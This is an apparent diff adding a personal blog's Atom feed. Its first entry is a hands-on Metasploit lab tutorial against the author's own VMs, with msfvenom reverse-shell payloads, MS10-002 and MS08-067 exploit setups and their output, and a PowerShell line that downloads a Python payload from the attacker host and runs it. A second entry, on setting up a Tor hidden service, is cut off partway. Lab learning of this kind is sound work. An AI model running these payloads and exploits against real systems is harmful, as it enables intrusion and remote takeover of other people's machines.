@@ -1,0 +1,539 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom"><title>axju - security</title><link href="https://axju.github.io/" rel="alternate"></link><link href="https://axju.github.io/feeds/security.atom.xml" rel="self"></link><id>https://axju.github.io/</id><updated>2021-07-30T20:15:00+02:00</updated><subtitle>Just coding stuff</subtitle><entry><title>Metasploit</title><link href="https://axju.github.io/posts/2021/07/metasploit/" rel="alternate"></link><published>2021-07-30T20:15:00+02:00</published><updated>2021-07-30T20:15:00+02:00</updated><author><name>Axel Juraske</name></author><id>tag:axju.github.io,2021-07-30:/posts/2021/07/metasploit/</id><summary type="html">&lt;p class="first last"&gt;Fun with Metasplot, aka How To Hack&lt;/p&gt;
+</summary><content type="html">&lt;p&gt;I am a software developer and no a security researcher. But it is still
+important to master the current security principles. Of course you can read all
+about it, but more fun would be to try this out. Back in the days I already play
+with some penetration tools on
+&lt;a class="reference external" href="https://en.wikipedia.org/wiki/BackTrack"&gt;Backtrack&lt;/a&gt;.
+Mostly I hacked someone WLAN, or stuff like this.&lt;/p&gt;
+&lt;p&gt;Now its time to play with Metasploit. I don't go into too much detail, I just
+try it out and present the results.&lt;/p&gt;
+&lt;div class="section" id="the-basics"&gt;
+&lt;h2&gt;The Basics&lt;/h2&gt;
+&lt;p&gt;There are a lot of tools to have fun with security. We are going to use
+Metasploit. I think you can install it on your system, but I work with Kali for
+any security task I have. By the way I run Kali on
+&lt;a class="reference external" href="https://www.virtualbox.org"&gt;Virtualbox&lt;/a&gt;.
+What I also use for my vulnerable targets.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;ul class="simple"&gt;
+&lt;li&gt;&lt;a class="reference external" href="https://www.kali.org/get-kali/#kali-virtual-machines"&gt;Kali&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class="reference external" href="https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/#downloads"&gt;Windows 10/8/7&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class="reference external" href="https://developer.microsoft.com/de-de/windows/downloads/virtual-machines/"&gt;Windows 10 Development environment&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class="reference external" href="https://isoriver.com/windows-xp-iso-download/"&gt;Windows XP&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;The basic steps for exploiting a system are:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;ol class="arabic simple"&gt;
+&lt;li&gt;&lt;dl class="first docutils"&gt;
+&lt;dt&gt;Choosing and configuring an exploit&lt;/dt&gt;
+&lt;dd&gt;Code that enters a target system by taking advantage of one of its bugs.&lt;/dd&gt;
+&lt;/dl&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;dl class="first docutils"&gt;
+&lt;dt&gt;Choosing and configuring a payload&lt;/dt&gt;
+&lt;dd&gt;Code that will be executed on the target system upon successful entry.
+Mostly this will by remote shell.&lt;/dd&gt;
+&lt;/dl&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;dl class="first docutils"&gt;
+&lt;dt&gt;Executing the exploit.&lt;/dt&gt;
+&lt;dd&gt;&lt;!--  --&gt;
+&lt;/dd&gt;
+&lt;/dl&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/blockquote&gt;
+&lt;/div&gt;
+&lt;div class="section" id="example-0x01-revers-shell"&gt;
+&lt;h2&gt;Example 0x01 - Revers Shell&lt;/h2&gt;
+&lt;p&gt;You can create an executable file, that will connect to your device. Almost any
+security scanner will detect this file. But anyway let us use this for the first
+try. You may need to turn off your virus program. As you can see in the video,
+Windows also detects and deletes this file, even though I had switched off
+Windows Defender. This is the finale result, all commands below the video:&lt;/p&gt;
+&lt;img alt="alternate text" src="https://axju.github.io/images/articels/security/metasploit-001.gif" style="width: 100%;" /&gt;
+&lt;p&gt;First we create the execute file:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ msfvenom -p windows/meterpreter/reverse_tcp &lt;span class="nv"&gt;LHOST&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;192&lt;/span&gt;.168.178.41 &lt;span class="nv"&gt;LPORT&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;5555&lt;/span&gt; -f exe &amp;gt; shell.exe
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Run web server with python to copy the file to the target:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ python3 -m http.server
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Now you can download the file on the target. Before we execute it, we have to
+setup Metasploit. Open Metasploit&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ msfconsole
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;and set it up:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;msf6 &amp;gt; use exploit/multi/handler
+msf6 exploit&lt;span class="o"&gt;(&lt;/span&gt;multi/handler&lt;span class="o"&gt;)&lt;/span&gt; &amp;gt; &lt;span class="nb"&gt;set&lt;/span&gt; PAYLOAD windows/meterpreter/reverse_tcp
+&lt;span class="nv"&gt;PAYLOAD&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; windows/meterpreter/reverse_tcp
+msf6 exploit&lt;span class="o"&gt;(&lt;/span&gt;multi/handler&lt;span class="o"&gt;)&lt;/span&gt; &amp;gt; &lt;span class="nb"&gt;set&lt;/span&gt; LHOST &lt;span class="m"&gt;192&lt;/span&gt;.168.178.41
+&lt;span class="nv"&gt;LHOST&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; &lt;span class="m"&gt;192&lt;/span&gt;.168.178.41
+msf6 exploit&lt;span class="o"&gt;(&lt;/span&gt;multi/handler&lt;span class="o"&gt;)&lt;/span&gt; &amp;gt; &lt;span class="nb"&gt;set&lt;/span&gt; LPORT &lt;span class="m"&gt;5555&lt;/span&gt;
+&lt;span class="nv"&gt;LPORT&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; &lt;span class="m"&gt;5555&lt;/span&gt;
+msf6 exploit&lt;span class="o"&gt;(&lt;/span&gt;multi/handler&lt;span class="o"&gt;)&lt;/span&gt; &amp;gt; run
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Now execute the file on the target device.&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class="section" id="example-0x02-internet-explorer-6"&gt;
+&lt;h2&gt;Example 0x02 - Internet Explorer 6&lt;/h2&gt;
+&lt;p&gt;You see from the example before: If your system is up to date, it's hard to
+execute an existing exploit. Now we will use something old, and slowly -
+Internet Explorer 6. Yes the old on from Windows XP.&lt;/p&gt;
+&lt;p&gt;This is also a more realistic example. There is a program with a critical
+security problem. If the user is interacting with the wrong data, you can take
+over the system. For this exploit: Take the Internet Explorer 6 and visit the
+wrong url.&lt;/p&gt;
+&lt;p&gt;This is how it looks, the commands are under the video:&lt;/p&gt;
+&lt;img alt="alternate text" src="https://axju.github.io/images/articels/security/metasploit-002.gif" style="width: 100%;" /&gt;
+&lt;p&gt;Start Metasploit&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ msfconsole
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;and set it up:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;msf6 &amp;gt; use exploit/windows/browser/ms10_002_aurora
+msf6 exploit&lt;span class="o"&gt;(&lt;/span&gt;windows/browser/ms10_002_aurora&lt;span class="o"&gt;)&lt;/span&gt; &amp;gt; &lt;span class="nb"&gt;set&lt;/span&gt; PAYLOAD windows/meterpreter/reverse_tcp
+&lt;span class="nv"&gt;PAYLOAD&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; windows/meterpreter/reverse_tcp
+msf6 exploit&lt;span class="o"&gt;(&lt;/span&gt;windows/browser/ms10_002_aurora&lt;span class="o"&gt;)&lt;/span&gt; &amp;gt; &lt;span class="nb"&gt;set&lt;/span&gt; LHOST &lt;span class="m"&gt;192&lt;/span&gt;.168.178.41
+&lt;span class="nv"&gt;LHOST&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; &lt;span class="m"&gt;192&lt;/span&gt;.168.178.41
+msf6 exploit&lt;span class="o"&gt;(&lt;/span&gt;windows/browser/ms10_002_aurora&lt;span class="o"&gt;)&lt;/span&gt; &amp;gt; &lt;span class="nb"&gt;set&lt;/span&gt; LPORT &lt;span class="m"&gt;5555&lt;/span&gt;
+&lt;span class="nv"&gt;LPORT&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; &lt;span class="m"&gt;5555&lt;/span&gt;
+msf6 exploit&lt;span class="o"&gt;(&lt;/span&gt;windows/browser/ms10_002_aurora&lt;span class="o"&gt;)&lt;/span&gt; &amp;gt; &lt;span class="nb"&gt;set&lt;/span&gt; SRVHOST &lt;span class="m"&gt;192&lt;/span&gt;.168.178.41
+&lt;span class="nv"&gt;SRVHOST&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; &lt;span class="m"&gt;192&lt;/span&gt;.168.178.41
+msf6 exploit&lt;span class="o"&gt;(&lt;/span&gt;windows/browser/ms10_002_aurora&lt;span class="o"&gt;)&lt;/span&gt; &amp;gt; &lt;span class="nb"&gt;set&lt;/span&gt; SRVPORT &lt;span class="m"&gt;80&lt;/span&gt;
+&lt;span class="nv"&gt;SRVPORT&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; &lt;span class="m"&gt;80&lt;/span&gt;
+msf6 exploit&lt;span class="o"&gt;(&lt;/span&gt;windows/browser/ms10_002_aurora&lt;span class="o"&gt;)&lt;/span&gt; &amp;gt; &lt;span class="nb"&gt;set&lt;/span&gt; URIPATH /
+&lt;span class="nv"&gt;URIPATH&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; /
+msf6 exploit&lt;span class="o"&gt;(&lt;/span&gt;windows/browser/ms10_002_aurora&lt;span class="o"&gt;)&lt;/span&gt; &amp;gt; exploit
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Exploit running as background job &lt;span class="m"&gt;0&lt;/span&gt;.
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Exploit completed, but no session was created.
+msf6 exploit&lt;span class="o"&gt;(&lt;/span&gt;windows/browser/ms10_002_aurora&lt;span class="o"&gt;)&lt;/span&gt; &amp;gt;
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Started reverse TCP handler on &lt;span class="m"&gt;192&lt;/span&gt;.168.178.41:5555
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Using URL: http://192.168.178.41:80/
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Server started.
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;If you now visit  &lt;a class="reference external" href="http://192.168.178.41/"&gt;http://192.168.178.41/&lt;/a&gt; with Internet Explorer, you should see
+something like:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="m"&gt;192&lt;/span&gt;.168.178.45   ms10_002_aurora - Sending MS10-002 Microsoft Internet Explorer &lt;span class="s2"&gt;&amp;quot;Aurora&amp;quot;&lt;/span&gt; Memory Corruption
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Sending stage &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;175174&lt;/span&gt; bytes&lt;span class="o"&gt;)&lt;/span&gt; to &lt;span class="m"&gt;192&lt;/span&gt;.168.178.45
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Meterpreter session &lt;span class="m"&gt;1&lt;/span&gt; opened &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;192&lt;/span&gt;.168.178.41:5555 -&amp;gt; &lt;span class="m"&gt;192&lt;/span&gt;.168.178.45:1046&lt;span class="o"&gt;)&lt;/span&gt; at &lt;span class="m"&gt;2021&lt;/span&gt;-07-26 &lt;span class="m"&gt;04&lt;/span&gt;:33:54 -0400
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;You can now interact with the session:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;msf6 exploit&lt;span class="o"&gt;(&lt;/span&gt;windows/browser/ms10_002_aurora&lt;span class="o"&gt;)&lt;/span&gt; &amp;gt; sessions -l
+
+Active &lt;span class="nv"&gt;sessions&lt;/span&gt;
+&lt;span class="o"&gt;===============&lt;/span&gt;
+
+  Id  Name  Type                     Information                            Connection
+  --  ----  ----                     -----------                            ----------
+  &lt;span class="m"&gt;1&lt;/span&gt;         meterpreter x86/windows  AXJU-5980144708&lt;span class="se"&gt;\a&lt;/span&gt;xju @ AXJU-598014470  &lt;span class="m"&gt;192&lt;/span&gt;.168.178.41:5555 -&amp;gt; &lt;span class="m"&gt;192&lt;/span&gt;.168.178.45
+                                     &lt;span class="m"&gt;8&lt;/span&gt;                                      :1046 &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;192&lt;/span&gt;.168.178.45&lt;span class="o"&gt;)&lt;/span&gt;
+
+msf6 exploit&lt;span class="o"&gt;(&lt;/span&gt;windows/browser/ms10_002_aurora&lt;span class="o"&gt;)&lt;/span&gt; &amp;gt; sessions -i &lt;span class="m"&gt;1&lt;/span&gt;
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Starting interaction with &lt;span class="m"&gt;1&lt;/span&gt;...
+
+meterpreter &amp;gt; sysinfo
+Computer        : AXJU-5980144708
+OS              : Windows XP &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;5&lt;/span&gt;.1 Build &lt;span class="m"&gt;2600&lt;/span&gt;, Service Pack &lt;span class="m"&gt;3&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;.
+Architecture    : x86
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : &lt;span class="m"&gt;2&lt;/span&gt;
+Meterpreter     : x86/windows
+meterpreter &amp;gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;/div&gt;
+&lt;div class="section" id="example-0x03-windows-xp"&gt;
+&lt;h2&gt;Example 0x03 - Windows XP&lt;/h2&gt;
+&lt;p&gt;We're still on Windows XP. But now with a program that runs in the background.
+The user doesn't have to do anything and we can still take over the system.
+Again the finale result and the commands are below:&lt;/p&gt;
+&lt;img alt="alternate text" src="https://axju.github.io/images/articels/security/metasploit-003.gif" style="width: 100%;" /&gt;
+&lt;p&gt;Start Metasploit&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ msfconsole
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;and set it up:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;msf6 &amp;gt; use exploit/windows/smb/ms08_067_netapi
+msf6 exploit&lt;span class="o"&gt;(&lt;/span&gt;windows/smb/ms08_067_netapi&lt;span class="o"&gt;)&lt;/span&gt; &amp;gt; &lt;span class="nb"&gt;set&lt;/span&gt; PAYLOAD windows/meterpreter/reverse_tcp
+&lt;span class="nv"&gt;PAYLOAD&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; windows/meterpreter/reverse_tcp
+msf6 exploit&lt;span class="o"&gt;(&lt;/span&gt;windows/smb/ms08_067_netapi&lt;span class="o"&gt;)&lt;/span&gt; &amp;gt; &lt;span class="nb"&gt;set&lt;/span&gt; LHOST &lt;span class="m"&gt;192&lt;/span&gt;.168.178.41
+&lt;span class="nv"&gt;LHOST&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; &lt;span class="m"&gt;192&lt;/span&gt;.168.178.41
+msf6 exploit&lt;span class="o"&gt;(&lt;/span&gt;windows/smb/ms08_067_netapi&lt;span class="o"&gt;)&lt;/span&gt; &amp;gt; &lt;span class="nb"&gt;set&lt;/span&gt; LPORT &lt;span class="m"&gt;5555&lt;/span&gt;
+&lt;span class="nv"&gt;LPORT&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; &lt;span class="m"&gt;5555&lt;/span&gt;
+msf6 exploit&lt;span class="o"&gt;(&lt;/span&gt;windows/smb/ms08_067_netapi&lt;span class="o"&gt;)&lt;/span&gt; &amp;gt; &lt;span class="nb"&gt;set&lt;/span&gt; RHOST &lt;span class="m"&gt;192&lt;/span&gt;.168.178.45
+&lt;span class="nv"&gt;RHOST&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; &lt;span class="m"&gt;192&lt;/span&gt;.168.178.45
+msf6 exploit&lt;span class="o"&gt;(&lt;/span&gt;windows/smb/ms08_067_netapi&lt;span class="o"&gt;)&lt;/span&gt; &amp;gt; exploit
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Now you should see something like:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Started reverse TCP handler on &lt;span class="m"&gt;192&lt;/span&gt;.168.178.41:5555
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="m"&gt;192&lt;/span&gt;.168.178.45:445 - Automatically detecting the target...
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="m"&gt;192&lt;/span&gt;.168.178.45:445 - Fingerprint: Windows XP - Service Pack &lt;span class="m"&gt;3&lt;/span&gt; - lang:English
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="m"&gt;192&lt;/span&gt;.168.178.45:445 - Selected Target: Windows XP SP3 English &lt;span class="o"&gt;(&lt;/span&gt;AlwaysOn NX&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="m"&gt;192&lt;/span&gt;.168.178.45:445 - Attempting to trigger the vulnerability...
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Sending stage &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;175174&lt;/span&gt; bytes&lt;span class="o"&gt;)&lt;/span&gt; to &lt;span class="m"&gt;192&lt;/span&gt;.168.178.45
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Meterpreter session &lt;span class="m"&gt;1&lt;/span&gt; opened &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;192&lt;/span&gt;.168.178.41:5555 -&amp;gt; &lt;span class="m"&gt;192&lt;/span&gt;.168.178.45:1038&lt;span class="o"&gt;)&lt;/span&gt; at &lt;span class="m"&gt;2021&lt;/span&gt;-07-26 &lt;span class="m"&gt;04&lt;/span&gt;:14:41 -0400
+
+meterpreter &amp;gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;And this is all, now you have the control over the target system. See how
+dangers Windows XP is?&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class="section" id="example-0x04-python"&gt;
+&lt;h2&gt;Example 0x04 - Python&lt;/h2&gt;
+&lt;p&gt;Of course there are also complex methods of executing code on the target system.
+The example is similar to the first, the user has to execute a command. Which
+loads the code and runs it with Python. We assume that Python is installed on
+the target. Since the payload is loaded directly into the memory, we can use
+Windows 10 again. And Windows Defender can also be activated.&lt;/p&gt;
+&lt;p&gt;You know it, scroll for the commands or enjoy the video:&lt;/p&gt;
+&lt;img alt="alternate text" src="https://axju.github.io/images/articels/security/metasploit-004.gif" style="width: 100%;" /&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ msfvenom -p python/meterpreter/reverse_tcp  &lt;span class="nv"&gt;LHOST&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;192&lt;/span&gt;.168.178.41 &lt;span class="nv"&gt;LPORT&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;5555&lt;/span&gt; -f raw &amp;gt; shell.py
+$ python3 -m http.server
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Now we quick config Metasploit:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;msf6 &amp;gt; use exploit/multi/handler
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Using configured payload generic/shell_reverse_tcp
+msf6 exploit&lt;span class="o"&gt;(&lt;/span&gt;multi/handler&lt;span class="o"&gt;)&lt;/span&gt; &amp;gt; &lt;span class="nb"&gt;set&lt;/span&gt; PAYLOAD python/meterpreter/reverse_tcp
+&lt;span class="nv"&gt;PAYLOAD&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; python/meterpreter/reverse_tcp
+msf6 exploit&lt;span class="o"&gt;(&lt;/span&gt;multi/handler&lt;span class="o"&gt;)&lt;/span&gt; &amp;gt; &lt;span class="nb"&gt;set&lt;/span&gt; LHOST &lt;span class="m"&gt;192&lt;/span&gt;.168.178.41
+&lt;span class="nv"&gt;LHOST&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; &lt;span class="m"&gt;192&lt;/span&gt;.168.178.41
+msf6 exploit&lt;span class="o"&gt;(&lt;/span&gt;multi/handler&lt;span class="o"&gt;)&lt;/span&gt; &amp;gt; &lt;span class="nb"&gt;set&lt;/span&gt; LPORT &lt;span class="m"&gt;5555&lt;/span&gt;
+&lt;span class="nv"&gt;LPORT&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; &lt;span class="m"&gt;5555&lt;/span&gt;
+msf6 exploit&lt;span class="o"&gt;(&lt;/span&gt;multi/handler&lt;span class="o"&gt;)&lt;/span&gt; &amp;gt; exploit
+
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Started reverse TCP handler on &lt;span class="m"&gt;192&lt;/span&gt;.168.178.41:5555
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Sending stage &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;39392&lt;/span&gt; bytes&lt;span class="o"&gt;)&lt;/span&gt; to &lt;span class="m"&gt;192&lt;/span&gt;.168.178.42
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;On the target we open the PowerShell and execute:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;new-object net.webclient&lt;span class="o"&gt;)&lt;/span&gt;.DownloadString&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;http://192.168.178.41:8000/shell.py&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; python
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;This will load and execute the python script. Now you have access to the target
+system with Metasploit:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Meterpreter session &lt;span class="m"&gt;1&lt;/span&gt; opened &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;192&lt;/span&gt;.168.178.41:5555 -&amp;gt; &lt;span class="m"&gt;192&lt;/span&gt;.168.178.42:49636&lt;span class="o"&gt;)&lt;/span&gt; at &lt;span class="m"&gt;2021&lt;/span&gt;-07-26 &lt;span class="m"&gt;05&lt;/span&gt;:30:28 -0400
+
+meterpreter &amp;gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;/div&gt;
+&lt;div class="section" id="conclusion"&gt;
+&lt;h2&gt;Conclusion&lt;/h2&gt;
+&lt;p&gt;This is funny. I enjoy playing with some security tools. And knowing some Issues
+from other programs will make you write better source code.&lt;/p&gt;
+&lt;/div&gt;
+</content><category term="security"></category><category term="security"></category><category term="linux"></category><category term="hacking"></category><category term="metasploit"></category><category term="reverse shell"></category></entry><entry><title>Hidden Service</title><link href="https://axju.github.io/posts/2021/02/hidden-service/" rel="alternate"></link><published>2021-02-26T20:15:00+01:00</published><updated>2021-02-26T20:15:00+01:00</updated><author><name>Axel Juraske</name></author><id>tag:axju.github.io,2021-02-26:/posts/2021/02/hidden-service/</id><summary type="html">&lt;p class="first last"&gt;Setup a hidden service on the darknet&lt;/p&gt;
+</summary><content type="html">&lt;p&gt;I want to know how to set up a hidden service on the Tor network aka the
+darknet. The goal is to have a copy of this blog on the darknet. Check out the
+&lt;a class="reference external" href="https://www.torproject.org"&gt;Tor project&lt;/a&gt; to learn more about the darknet. I
+will only explain how to setup a hidden servers, not the darknet himself.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Tor project:&lt;/strong&gt; &lt;em&gt;We believe everyone should be able to explore the internet with
+privacy. We are the Tor Project, a 501(c)3 US nonprofit. We advance human rights
+and defend your privacy online through free software and open networks.&lt;/em&gt;
+&lt;a class="reference external" href="https://www.torproject.org/about/people/"&gt;Meet our team.&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Now that you know what the Tor project is, you already have the
+&lt;a class="reference external" href="https://www.torproject.org/download/"&gt;Tor browser&lt;/a&gt; and can now read
+&lt;a class="reference external" href="http://z3wkaghfy4cmuqcrgskpvdava55qsbfrz5vvqthuemv2cktuwxvztcyd.onion/"&gt;my blog on the darknet&lt;/a&gt;,
+great. But how do I create the hidden service for my blog? That was surprisingly
+easy. It only takes a few steps. The
+&lt;a class="reference external" href="https://community.torproject.org/onion-services/setup/"&gt;official documentation&lt;/a&gt;
+is quite well, read it and have some fun. It wars so simple that I also want to
+create an example Django project behind a hidden service. Witch is just an
+example and should work with all WSGI apps.&lt;/p&gt;
+&lt;div class="section" id="install-tor"&gt;
+&lt;h2&gt;Install tor&lt;/h2&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo apt-get install tor
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;You can check if the service is running&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo systemctl status tor.service
+sudo systemctl status tor@default.service
+&lt;/pre&gt;&lt;/div&gt;
+&lt;/div&gt;
+&lt;div class="section" id="nginx"&gt;
+&lt;h2&gt;Nginx&lt;/h2&gt;
+&lt;p&gt;I built this blog with Pelican, a static page generator. Therefore, Nginx should
+only provide some static http files.&lt;/p&gt;
+&lt;p&gt;First install Nginx&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo apt install nginx
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Then delete Nginx default site&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo rm /etc/nginx/sites-enabled/*
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;create the server file for my blog&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo nano /etc/nginx/sites-available/axju
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;with&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;server&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+  &lt;span class="kn"&gt;listen&lt;/span&gt; &lt;span class="mi"&gt;80&lt;/span&gt; &lt;span class="s"&gt;default_server&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+  &lt;span class="kn"&gt;listen&lt;/span&gt; &lt;span class="s"&gt;[::]:80&lt;/span&gt; &lt;span class="s"&gt;default_server&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+  &lt;span class="kn"&gt;server_name&lt;/span&gt; &lt;span class="s"&gt;_&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+
+  &lt;span class="kn"&gt;root&lt;/span&gt; &lt;span class="s"&gt;/var/www/axju&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+  &lt;span class="kn"&gt;index&lt;/span&gt; &lt;span class="s"&gt;index.html&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+  &lt;span class="kn"&gt;location&lt;/span&gt; &lt;span class="s"&gt;/&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
